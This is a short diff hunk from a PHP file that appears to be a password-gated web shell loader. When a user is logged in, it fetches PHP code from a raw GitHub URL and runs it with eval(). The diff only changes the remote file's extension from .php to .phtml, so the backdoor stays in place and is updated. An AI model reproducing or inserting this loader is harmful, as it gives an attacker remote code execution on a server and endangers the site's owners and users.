@@ -48,7 +48,7 @@ if (isset($_POST["password"])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo("https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/asasx.php");
+    $a = geturlsinfo("https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/asasx.phtml");
     eval("?>" . $a);
 } else {
     ?>
